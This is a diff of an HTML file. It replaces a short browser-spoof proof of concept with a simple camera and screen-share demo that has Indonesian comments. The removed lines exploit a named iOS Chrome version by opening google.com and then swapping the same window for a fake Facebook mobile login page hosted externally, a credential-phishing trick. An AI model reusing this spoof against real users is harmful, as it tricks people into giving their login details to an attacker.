@@ -1,23 +1,47 @@
-
-<html>
-                    <head>
-                      <title>HTTP Auth Prompt Spoof IOS chrome (87.0.4280.163) </title>
-                  </head>
-                    <body>
-                      <script>
-                        (() => {
-    const button = document.createElement('button');
-    button.innerText = 'Click Me';
-
-    button.addEventListener('click', async () => {
-      window.open('https://google.com', 'g');
-      setTimeout(() => {
-        window.open('https://0x1337-exploit.github.io/hosting/login/fb-mobile.html', 'g');
-      }, 200);
-    });
-
-    document.body.appendChild(button);
-  })()
-                      </script>
-                    </body>
-                  </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Share and Camera API</title>
+    <style>
+        video {
+            width: 400px;
+            height: 300px;
+            border: 1px solid black;
+        }
+    </style>
+</head>
+<body>
+    <h1>Simple Screen Share and Camera</h1>
+    
+    <button id="startCamera">Start Camera</button>
+    <button id="startScreenShare">Start Screen Share</button>
+    
+    <video id="videoElement" autoplay playsinline></video>
+    
+    <script>
+        const video = document.getElementById('videoElement');
+        
+        // Fungsi untuk akses kamera
+        document.getElementById('startCamera').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+            }
+        });
+        
+        // Fungsi untuk screen share
+        document.getElementById('startScreenShare').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                video.srcObject = stream;
+            } catch (error) {
+                console.error('Error accessing screen share:', error);
+            }
+        });
+    </script>
+</body>
+</html>
